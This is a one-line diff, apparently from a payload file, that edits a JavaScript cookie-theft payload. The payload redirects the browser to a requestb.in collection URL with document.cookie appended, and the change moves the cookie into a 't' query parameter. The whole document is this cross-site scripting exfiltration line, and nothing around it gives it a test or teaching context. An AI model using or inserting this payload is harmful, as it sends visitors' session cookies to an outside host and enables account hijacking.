@@ -1,1 +1,1 @@
-location="https://requestb.in/x1n9mwx1"+document.cookie;
+location="https://requestb.in/x1n9mwx1?t="+document.cookie;
